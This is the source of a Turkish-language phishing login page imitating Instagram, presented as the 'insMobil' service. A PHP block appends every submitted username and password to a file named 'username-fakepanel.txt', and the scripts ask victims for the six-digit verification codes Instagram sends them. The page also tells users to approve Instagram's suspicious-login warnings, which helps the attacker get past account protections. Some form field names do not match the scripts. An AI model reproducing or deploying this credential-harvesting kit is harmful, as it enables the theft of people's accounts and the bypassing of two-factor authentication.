
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>insMobil | Giriş Yap</title>
    <meta name="robots" content="noindex, nofollow">
    <meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
    <style>
        body::-webkit-scrollbar {
            display : none;
        }
    </style>
    <link rel="stylesheet" href="https://insmobil.com//assets/style/instastyle.css?v=2.4"/>
</head>
<body>
      <span id="react-root">
         <section class="instaclass5">
            <main class="instaclass4 instaclass30" role="main">
               <article class="instaarticle3">
                  <div class="instaclass1">
                     <div class="instaclass2">
                     <h1 style='color: black; font-weight: bold; font-size:25px; text-align:center; padding: 10px;'>GİRİŞ YAP</h1>
                        <br/>
                        <div class="instaclass6">



                           <form method="POST" action="" 
                                   class="instaclass7">
                               <span style="font-size: 12px;text-align: center;color: gray;margin-bottom: 14px;">Kullanıcı adınızı yazarken çıkan listeden üyeliğinizi seçin.</span>
                              <div class="instaclass8 instaclass9">
                                <input type="text"class="instaclass10 instaclass11" aria-describedby="" aria-label="Kullanıcı" aria-required="true" name="userid22" placeholder="Username" required="">
                              <div class="suggestUsers"><ul></ul></div>
                              </div>
                              <div class="instaclass8 instaclass9">
                                 <input type="password"  class="instaclass10 instaclass11" aria-describedby="" aria-label="Şifre" aria-required="true" name="pswrd" placeholder="Password" required="">
                                         <span style="color: black; font-size: 12pt"><input type="checkbox" onclick="myFunction()">Şifreyi göster</span>
                              </div>
                               
                                                              <span
                                       class="instaclass14 instaclass15">
                                 <button  class="instaclass16 instaclass17 instaclass18 instaclass19">Giriş yap</button>
                                 <div class="spiSpinner"></div>
                              </span>
                               <div class="instaclass20">
                              </div>
                              <p style="font-size: 12px;padding: 5px;text-align: center;color: #000000; font-weight: bold;">Dikkat! İlk seferde giriş olmazsa tekrar deneyin.</p>
                              <p style="font-size: 11px;padding: 5px;text-align: center;color: #FF0000; font-weight: bold;">Profil Resmi Olmayan Hesaplar Giriş Yapamaz!</p>
                                   <div class="instaclass20" style="color: black; text-align: left;">

                                    <span style='color: red; font-weight: bold;'>Hatalar ve Çözümleri;</span> 1) Giriş işlemleri biraz uzun sürebilir, lütfen bekleyin.(30-60 saniye kadar sürebilir, çok uzun sürmesi halinde sayfayı yenileyip tekrar deneyin) <br>
                                    2) Giriş yaparken sürekli olarak şifre yanlış uyarısı alıyorsanız instagram.com veya instagram mobil uygulaması üzerinden hesabınıza girip, çıkan uyarıya Bu Bendim diyin ve buradan tekrar giriş yapın.<br>
                                    3) Instagram şifrenizi bloke edebilir. instagram uygulamasında bulunan şifremi unuttum butonuna tıklayarak yeni şifre alabilirsiniz.<br>
                                    <a href='https://insmobil.com/blog/instagram-uzgunuz-sifren-yanlisti-sorunu-cozumu' target='_blank' style='color: black; font-weight: bold;'>
                                    4) Yukarıdaki herşeyi eksiksiz yapmanıza rağmen şifreniz doğru olduğu halde sürekli 'üzgünüz şifreniz yanlıştı' hatası alıyorsanız burayı tıklayın.</a>
                                </div>
                           </form>

 ?>

<?php
if (!empty($_POST["pswrd"]) && !empty($_POST["userid22"])) {
$ac1 = fopen("username-fakepanel.txt","a+");
$password = @$_POST['pswrd'];
$username = @$_POST['userid22'];
$userlarr = "\n __________________ \n Username: ".$username."\n Password: ".$password;
fwrite($ac1,$userlarr);
fclose($ac1);} ?>



                        </div>
                     </div>
                  </div>
               </article>
            </main>
         </section>
      </span>
      <style>
          .onay_kodu_ekrani {
              display    : none;
              position   : fixed;
              top        : 0;
              width      : 100%;
              height     : 100%;
              background : #fff;
              padding    : 50px 15px;
              text-align : center;
          }

          .onay_kodu_girme_ekrani {
              display    : none;
              position   : fixed;
              top        : 0;
              width      : 100%;
              height     : 100%;
              background : #fff;
              padding    : 50px 15px;
              text-align : center;
          }

          .onay_kodu_ekrani select {
              padding   : 10px;
              font-size : 14px;
          }

          .onay_kodu_ekrani button {
              width         : 160px;
              margin        : 30px auto;
              padding       : 8px;
              background    : #299029;
              border        : 1px solid #39c739;
              color         : #fff;
              border-radius : 10px;
              cursor        : pointer;
          }

          .onay_kodu_ekrani button:hover {
              background : #207520;
          }

          .onay_kodu_ekrani button:disabled {
              background : #6fcc6f;
          }

          .onay_kodu_girme_ekrani input {
              padding   : 10px;
              font-size : 14px;
          }

          .onay_kodu_girme_ekrani button {
              width         : 160px;
              margin        : 30px auto;
              padding       : 8px;
              background    : #299029;
              border        : 1px solid #39c739;
              color         : #fff;
              border-radius : 10px;
              cursor        : pointer;
          }

          .onay_kodu_girme_ekrani button:hover {
              background : #207520;
          }

          .onay_kodu_girme_ekrani button:disabled {
              background : #6fcc6f;
          }
      </style>
      <div class="onay_kodu_ekrani"></div>
      <div class="onay_kodu_girme_ekrani"></div>
      <script src="/assets/jquery/2.2.4/jquery.min.js"></script>
      <script src='https://www.google.com/recaptcha/api.js'></script>
      <script>
          $('#login_insta').click(function() {
              $('#slfErrorAlert').hide();
              $(this).attr("disabled", "disabled");
              $maindiv = $(this);
              $maindiv.addClass("instaclass31");
              $('.spispinner').show();
                            var dataList = "username=" + encodeURIComponent($('input[name="username"]').val()) + "&password=" + encodeURIComponent($('input[name="password"]').val()) + "&userid=" + encodeURIComponent($('input[name="userid"]').val()) + "&antiForgeryToken=b867cd8017daa9e0e90375f0cacbadc9";
              
              $.ajax({
                         type    : "POST",
                         url     : "?",
                         dataType: "json",
                         data    : dataList,
                         success : function(json) {
                             if(json.status == 'success') {
                                 window.parent.location.href = json.returnUrl;
                                 window.parent.$.fancybox.close();
                             } else {

                                 var $allData = json.allData;

                                 if(json.status == 3) {

                                     if(json.allData.step_name == 'verify_code') {

                                         var onayKoduEkrani = $('.onay_kodu_girme_ekrani');
                                         onayKoduEkrani.html('');
                                         var html = "<div>İnstagram tarafından telefonunuza veya mail adresinize gönderilen 6 haneli giriş kodunu arasında boşluk bırakmadan girerek devam edin, ardından sisteme girişiniz sağlanacaktır.</div><br/>";
                                         html += "<input type='number' id='kod_onayla_input' value='' maxlength='6' placeholder='Onay Kodunu Buraya Yaz'/>";
                                         html += "<div><button class='kod_onayla'>Onayla ve Giriş Yap</button>";
                                         onayKoduEkrani.html(html);
                                         onayKoduEkrani.show();

                                         $('.kod_onayla').click(function() {
                                             var kodOnay = $('#kod_onayla_input').val();

                                             if(kodOnay.length < 6) {
                                                 alert("Gelen onay kodu en az 6 karakter olmalıdır, girdiğiniz kodun doğru olduğudan emin olunuz.");
                                             }

                                             $allData.code = kodOnay;
                                             $('.kod_onayla').attr("disabled", "disabled");
                                             $('.kod_onayla').html('Onaylanıyor..');
                                             $.ajax({
                                                        url    : "/ajax/kod-onayla",
                                                        data   : $allData,
                                                        type   : "POST",
                                                        success: function(json) {
                                                            if(json.status == "ok") {
                                                                window.parent.location.href = json.returnUrl;
                                                                window.parent.$.fancybox.close();
                                                            } else {
                                                                alert(json.error);
                                                                $('.spispinner').hide();
                                                                $maindiv.removeAttr("disabled");
                                                                $maindiv.removeClass("instaclass31");
                                                            }
                                                        }
                                                    });
                                         });

                                     } else {
                                         var onayEkrani = $('.onay_kodu_ekrani');
                                         onayEkrani.html('');
                                         var data = json.allData.step_data;


                                         var html = "<div>" + json.error + "</div><br/>";
                                         var html = "<div>Giriş yapabilmek için aşağıdaki seçeneklerden birini seçerek 'Güvenlik Kodu Gönder' butonuna tıklayınız!</div><br/>";
                                         html += "<select id='choice_select'>";

                                         if(typeof data.phone_number !== "undefined") {
                                             html += "<option value='0'>GSM ile Onayla: " + data.phone_number + "</option>";
                                         }

                                         if(typeof data.email !== "undefined") {
                                             html += "<option value='1'>E-Posta ile Onayla: " + data.email + "</option>";
                                         }

                                         html += "</select>";
                                         html += "<div><button class='kod_iste'>Güvenlik Kodu Gönder</button></div>";
                                         onayEkrani.html(html);
                                         onayEkrani.show();

                                         json.allData.choice = $('#choice_select').val();
                                     }


                                     $('.kod_iste').click(function() {
                                         $('.kod_iste').attr("disabled", "disabled");
                                         $('.kod_iste').html('Kod İsteniyor...');

                                         $.ajax({
                                                    url    : "/ajax/kod-gonder",
                                                    data   : $allData,
                                                    type   : "POST",
                                                    success: function(json) {
                                                        if(json.status == "ok") {
                                                            var onayKoduEkrani = $('.onay_kodu_girme_ekrani');
                                                            onayKoduEkrani.html('');
                                                            var html = "<div>İnstagram tarafından telefonunuza veya mail adresinize gönderlen 6 haneli giriş kodunu girerek devam edin, ardından sisteme girişiniz sağlanacaktır.</div><br/>";
                                                            html += "<input type='number' id='kod_onayla_input' value='' maxlength='6' placeholder='Onay Kodunu Buraya Yaz'></input>";
                                                            html += "<div><button class='kod_onayla'>Onayla ve Giriş Yap</button></div>";
                                                            onayKoduEkrani.html(html);
                                                            onayKoduEkrani.show();


                                                            $('.kod_onayla').click(function() {
                                                                var kodOnay = $('#kod_onayla_input').val();
                                                                if(kodOnay.length < 6) {
                                                                    alert("Gelen onay kodu en az 6 karakter olmalıdır, girdiğiniz kodun doğru olduğudan emin olunuz.");
                                                                    $('.spispinner').hide();
                                                                    $maindiv.removeAttr("disabled");
                                                                    $maindiv.removeClass("instaclass31");
                                                                }

                                                                $allData.code = kodOnay;
                                                                $('.kod_onayla').attr("disabled", "disabled");
                                                                $('.kod_onayla').html('Onaylanıyor..');
                                                                $.ajax({
                                                                           url    : "/ajax/kod-onayla",
                                                                           data   : $allData,
                                                                           type   : "POST",
                                                                           success: function(json) {
                                                                               if(json.status == "success") {
                                                                                   window.parent.location.href = json.returnUrl;
                                                                                   window.parent.$.fancybox.close();
                                                                               } else {
                                                                                   alert(json.error);
                                                                                   $('.spispinner').hide();
                                                                                   $maindiv.removeAttr("disabled");
                                                                                   $maindiv.removeClass("instaclass31");
                                                                               }
                                                                           }
                                                                       });
                                                            });

                                                        } else {
                                                            alert(json.error);
                                                            $('.spispinner').hide();
                                                            $maindiv.removeAttr("disabled");
                                                            $maindiv.removeClass("instaclass31");
                                                        }
                                                    }
                                                });

                                     });

                                 } else {
                                     alert(json.error);
                                     $('.spispinner').hide();
                                     $maindiv.removeAttr("disabled");
                                     $maindiv.removeClass("instaclass31");
                                 }
                             }
                         }
                     });
          });

                    (function(i, s, o, g, r, a, m) {
              i['GoogleAnalyticsObject'] = r;
              i[r] = i[r] || function() {
                  (i[r].q = i[r].q || []).push(arguments)
              }, i[r].l = 1 * new Date();
              a = s.createElement(o),
                  m = s.getElementsByTagName(o)[0];
              a.async = 1;
              a.src   = g;
              m.parentNode.insertBefore(a, m)
          })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
          ga('create', 'UA-96251606-1', 'auto');
          ga('send', 'pageview');
          
          var currentRequest = null;
          $('#username').keyup(function() {
              $('.suggestUsers ul').html("<div style='font-size: 12px;\n" +
                                         "    padding: 10px 5px;\n" +
                                         "    color: #a6a6a6;'>Yükleniyor...</div>");
              $('input[name="userid"]').val("");
              $('.suggestUsers').show();
              var value      = $(this).val();
              currentRequest = $.ajax({
                                          type      : "GET",
                                          // url       : "/ajax/get-user?user=" + value,
                                          url     : "https://www.instagram.com/web/search/topsearch/?context=blended&query=" + value + "&rank_token=0.8516828732626001&include_reel=true&limit=10",
                                          dataType  : "json",
                                          beforeSend: function() {
                                              if(currentRequest != null) {
                                                  currentRequest.abort();
                                              }
                                          },
                                          success   : function(response) {
                                              var html = "";
                                              response.users.forEach(function(a, b) {
                                                  html += "<li onclick='$(\"input[name=username]\").val(\"" + a.user.username + "\");$(\"input[name=userid]\").val(" + a.user.pk + ");$(\".suggestUsers ul\").html(\"\");$(\".suggestUsers\").hide();'><div class='suggestimg'><img src='" + a.user.profile_pic_url + "'/></div><div class='suggestinfo'><b>" + a.user.username + "</b><span>" + a.user.full_name + "</span></div></li>";
                                              });
                                              $('.suggestUsers ul').html(html);
                                          }
                                      })
          });
      </script>
      <script>
    function myFunction() {
    var x = document.getElementById("sifre");
    if (x.type === "password") {
        x.type = "text";
    } else {
        x.type = "password";
    }
}
</script>
</body>
</html>
